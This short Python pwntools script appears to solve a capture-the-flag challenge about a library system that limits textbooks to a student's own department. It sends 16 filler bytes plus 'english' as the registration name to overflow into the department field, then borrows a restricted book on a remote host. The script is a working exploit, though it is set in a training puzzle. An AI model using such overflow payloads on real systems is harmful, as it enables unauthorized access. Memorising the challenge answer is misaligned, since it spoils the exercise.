"""
Major textbooks are restricted to students of that department only.
Youngjae is studying Computer Science.
But he wants to check out an English department book as a gift for his girlfriend,
who is obsessed with Shakespeare.
Unfortunately, the system enforces strict borrowing rules, 
preventing students from accessing books outside their department.
Still, Youngjae refuses to give up.
Determined to borrow the English textbook, he sets out to hack the system!
"""

from pwn import *

# 연결
r = remote('128.134.83.160', 41401)

# 메뉴 1: Register
r.sendlineafter(b"Choice: ", b"1")
payload = b"A"*16 + b"english"
r.sendlineafter(b"Enter your name: ", payload)

# 메뉴 2: Borrow
r.sendlineafter(b"Choice: ", b"2")
r.sendlineafter(b"Enter book ID: ", b"0")

# 결과 출력
r.interactive()
